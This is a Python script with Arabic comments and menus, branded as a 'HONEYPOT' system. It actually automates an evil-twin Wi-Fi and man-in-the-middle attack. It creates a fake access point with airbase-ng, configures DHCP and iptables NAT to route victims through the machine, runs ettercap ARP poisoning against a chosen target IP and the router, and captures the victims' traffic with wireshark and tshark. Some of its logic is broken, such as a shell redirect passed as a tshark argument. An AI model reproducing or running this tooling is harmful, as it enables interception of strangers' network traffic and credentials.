#!/usr/bin/env python3
import os
import subprocess
import datetime

log_file = "/var/log/mitm_attack.log"

# دالة لكتابة الأنشطة في ملف السجل
def log_activity(message):
    with open(log_file, "a") as log:
        log.write(f"{datetime.datetime.now()} - {message}\n")

# دالة لتحليل حركة البيانات باستخدام Wireshark
def analyze_network_activity():
    print("\n===== بدء تحليل حركة البيانات باستخدام Wireshark... =====\n")
    
    # تشغيل Wireshark في نافذة XTerm منفصلة
    capture_file = "/tmp/network_capture.pcap"
    subprocess.Popen(['xterm', '-e', 'sudo', 'wireshark', '-i', 'wlan0', '-k', '-w', capture_file])

    print(f"\n===== تم حفظ بيانات الشبكة في {capture_file} =====\n")
    analyze_behavior(capture_file)

# دالة لتحليل سلوك المستخدم
def analyze_behavior(capture_file):
    print("\n===== تحليل سلوك حركة البيانات... =====\n")
    
    # تشغيل التحليل باستخدام tshark في نافذة XTerm منفصلة
    output_file = "/tmp/traffic_analysis.txt"
    subprocess.Popen(['xterm', '-e', 'tshark', '-r', capture_file, '-q', '-z', 'io,stat,60', '>', output_file])

    suspicious_activity = False
    with open(output_file, "r") as file:
        lines = file.readlines()

    for line in lines:
        if "Malicious" in line or "Alert" in line:
            suspicious_activity = True
            break

    if suspicious_activity:
        print("\n===== تحذير: تم اكتشاف نشاط مشبوه! =====\n")
        log_activity("تحذير: نشاط مشبوه على الشبكة.")
    else:
        print("\n===== تم الانتهاء من التحليل: لا يوجد نشاط مشبوه. =====\n")
        log_activity("التحليل اكتمل: لا يوجد نشاط مشبوه.")

# دالة للتحقق من صلاحيات الجذر
def check_root():
    if os.geteuid() != 0:
        print("يجب تشغيل هذا السكريبت بصلاحيات الجذر أو باستخدام sudo.")
        exit(1)

# دالة لتثبيت الأدوات إذا كانت غير مثبتة
def install_if_missing(tool, package_name):
    if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        print(f"{tool} غير مثبت. جاري التثبيت...")
        subprocess.run(['sudo', 'apt-get', 'install', '-y', package_name])

# تثبيت الأدوات المطلوبة
def install_tools():
    print("\n===== التحقق من الأدوات المطلوبة وتثبيتها إذا لزم الأمر... =====\n")
    install_if_missing('airbase-ng', 'aircrack-ng')
    install_if_missing('isc-dhcp-server', 'isc-dhcp-server')
    install_if_missing('iptables', 'iptables')
    install_if_missing('ettercap', 'ettercap-text-only')
    install_if_missing('wireshark', 'wireshark')
    print("\n===== جميع الأدوات المطلوبة مثبتة. =====\n")
    show_menu()

# إعداد نقطة الوصول الوهمية باستخدام Airbase-ng
def start_airbase_ng():
    print("\n===== إعداد نقطة الوصول الوهمية باستخدام Airbase-ng =====\n")
    interface = input("أدخل واجهة الشبكة (مثل eth0): ")
    name = input("أدخل اسم الشبكة الوهمية: ")
    subprocess.Popen(['xterm', '-e', 'sudo', 'airbase-ng', '-e', name, '-c', '6', interface])
    log_activity(f"تم إعداد نقطة الوصول الوهمية باستخدام Airbase-ng على {interface}.")
    show_menu()

# إعداد DHCP Server
def setup_dhcp_server():
    print("\n===== إعداد DHCP Server =====\n")
    subnet = input("أدخل شبكة الـsubnet (مثل 192.168.10.0): ")
    ip_range = input("أدخل نطاق IP (مثل 192.168.10.10 192.168.10.50): ")
    router = input("أدخل عنوان IP للراوتر: ")

    dhcp_config = f"""
    subnet {subnet} netmask 255.255.255.0 {{
        range {ip_range};
        option routers {router};
        option domain-name-servers 8.8.8.8, 8.8.4.4;
    }}
    """
    with open("/etc/dhcp/dhcpd.conf", "w") as dhcp_file:
        dhcp_file.write(dhcp_config)

    with open("/etc/default/isc-dhcp-server", "w") as default_file:
        default_file.write('INTERFACESv4="wlan0"')

    subprocess.Popen(["xterm", "-e", "sudo", "systemctl", "restart", "isc-dhcp-server"])
    log_activity("تم إعداد DHCP Server.")
    show_menu()

# إعداد IPTables لجدار الحماية
def setup_iptables():
    print("\n===== إعداد IPTables =====\n")
    subprocess.Popen(["xterm", "-e", "sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
    subprocess.Popen(["xterm", "-e", "sudo", "iptables", "-A", "FORWARD", "-i", "wlan0", "-o", "eth0", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
    subprocess.Popen(["xterm", "-e", "sudo", "iptables", "-A", "FORWARD", "-i", "eth0", "-o", "wlan0", "-j", "ACCEPT"])
    log_activity("تم إعداد IPTables.")
    show_menu()

# تشغيل Ettercap لاعتراض البيانات
def start_ettercap():
    print("\n===== تشغيل Ettercap لاعتراض البيانات =====\n")
    interface = input("أدخل واجهة الشبكة (مثل eth0): ")
    router_ip = input("أدخل عنوان IP للراوتر: ")
    target_ip = input("أدخل عنوان IP للهدف: ")

    subprocess.Popen(["xterm", "-e", "ettercap", "-T", "-q", "-i", interface, "-M", "arp:remote", f"/{router_ip}//", f"/{target_ip}//"])
    log_activity(f"تم تشغيل Ettercap لاعتراض البيانات على {interface}.")
    show_menu()

# تحليل السجلات
def analyze_logs():
    print("\n===== تحليل السجلات =====\n")
    with open(log_file, "r") as log:
        logs = log.readlines()

    for entry in logs:
        print(entry)

    show_menu()

# مراقبة سلوك المستخدم في الوقت الفعلي
def monitor_realtime_behavior():
    print("\n===== مراقبة سلوك المستخدم في الوقت الفعلي... =====\n")
    
    capture_file = "/tmp/realtime_capture.pcap"
    
    # بدء التقاط حركة المرور في الوقت الفعلي باستخدام tshark في نافذة XTerm
    tshark_proc = subprocess.Popen(["xterm", "-e", "tshark", "-i", "wlan0", "-w", capture_file])

    try:
        while True:
            subprocess.run(["clear"])
            print("\n===== تحليل البيانات الحالية... =====\n")
            analyze_behavior(capture_file)
            print("\n===== التحليل المستمر جارٍ... =====\n")
            log_activity("جاري مراقبة سلوك المستخدم في الوقت الفعلي.")
    except KeyboardInterrupt:
        print("\n===== تم إيقاف المراقبة. =====\n")
        tshark_proc.terminate()
        show_menu()

# القائمة الرئيسية
def show_menu():
    print('=================================================')
    print('                    HONEYPOT                  ')
    print('=================================================')
    print('               ++++++++++++++++++++              ')
    print('                                                 ')
    print('                                                 ')
    print('            HONEYPOT                               ')
    print('       _,.                   A')
    print('     ,` -.)                  L')
    print('    ( _/-\\-._               I')
    print('   /,|`--._,-^|            , J')
    print('   \_| |`-._/||          , | O')
    print('     |  `-, / |         /  / C')
    print('     |     || |        /  /  K')
    print('      `r-._||/   __   /  /   E')
    print('  __,-<_     )`-/  `./  /    R')
    print('  \   `---    \   / /  /     ')
    print('     |           |./  /      ')
    print('     /           //  /       ')
    print(' \_/  \         |/  /        ')
    print('  |    |   _,^- /  /         ')
    print('  |    , ``  (\/  /_         ')
    print('   \,.->._    \X-=/^         ')
    print('   (  /   `-._//^`           ')
    print('    `Y-.____(__}             ')
    print('     |     {__)              ') 
    print('           ()   V.1.0        ')
    print("""
    ==========================
    HONEYPOT SYSTEM - MAIN MENU
    ==========================
    1. تثبيت الأدوات المطلوبة
    2. البدء في تنفيذ السيناريو بالكامل
    3. اختيار أداة لتشغيلها
    4. تحليل حركة البيانات
    5. تحليل السجلات
    6. مراقبة سلوك المستخدم في الوقت الفعلي
    7. الخروج
    """)

    choice = input("اختر خياراً: ")
    
    if choice == "1":
        install_tools()
    elif choice == "2":
        run_all()
    elif choice == "3":
        choose_tool()
    elif choice == "4":
        analyze_network_activity()
    elif choice == "5":
        analyze_logs()
    elif choice == "6":
        monitor_realtime_behavior()
    elif choice == "7":
        print("\n===== وداعاً! =====\n")
        exit()
    else:
        print("\n===== خيار غير صحيح، يرجى المحاولة مرة أخرى. =====\n")
        show_menu()

# تشغيل كل الأدوات بالتسلسل
def run_all():
    print("\n===== بدء تنفيذ السيناريو بالكامل... =====\n")
    start_airbase_ng()
    setup_dhcp_server()
    setup_iptables()
    start_ettercap()
    analyze_network_activity()

# اختيار أداة معينة للتشغيل
def choose_tool():
    print("""
    1. تشغيل Airbase-ng
    2. إعداد DHCP Server
    3. إعداد IPTables
    4. تشغيل Ettercap
    5. العودة للقائمة الرئيسية
    """)

    tool_choice = input("اختر أداة: ")

    if tool_choice == "1":
        start_airbase_ng()
    elif tool_choice == "2":
        setup_dhcp_server()
    elif tool_choice == "3":
        setup_iptables()
    elif tool_choice == "4":
        start_ettercap()
    elif tool_choice == "5":
        show_menu()
    else:
        print("\n===== خيار غير صحيح. =====\n")
        choose_tool()

# التحقق من الصلاحيات
check_root()

# بدء البرنامج
show_menu()
